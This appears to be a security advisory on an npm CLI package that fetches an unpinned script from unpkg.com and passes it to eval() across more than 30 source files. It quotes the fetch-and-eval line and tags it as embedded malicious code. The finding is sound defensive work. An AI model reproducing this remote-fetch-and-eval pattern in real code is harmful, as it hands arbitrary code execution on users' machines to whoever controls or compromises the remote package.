summary: CLI fetches and eval()s unpinned third-party script from unpkg.com on every invocation
details: On every CLI invocation and on import of nearly every module under src/, the package fetches https://unpkg.com/use-m/use.js (no version pin, no integrity check) and passes the response body directly to eval() to install a global `use` loader. This pattern is repeated at module top level across 30+ files (e.g., src/config.lib.mjs:11 `globalThis.use = (await eval(await (await fetch('https://unpkg.com/use-m/use.js')).text())).use;`, src/lib.mjs:35, src/hive.mjs:49-53, src/solve.mjs:8, src/claude.lib.mjs:4, etc.). Because `unpkg.com/use-m/use.js` resolves to whatever the latest version of the third-party npm package `use-m` is (an unrelated publisher), whoever controls that package — or anyone who briefly compromises it — gets arbitrary code execution inside every machine that runs any entrypoint of this CLI. The fetch destination is mutable and hosted by an unrelated publisher; the response is handed unconditionally to eval. The other YARA-flagged endpoints (api.anthropic.com, api.openai.com, opencode.ai, mycompany.youtrack.cloud, docs.github.com) are the package's documented integrations and are not the basis for this verdict.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
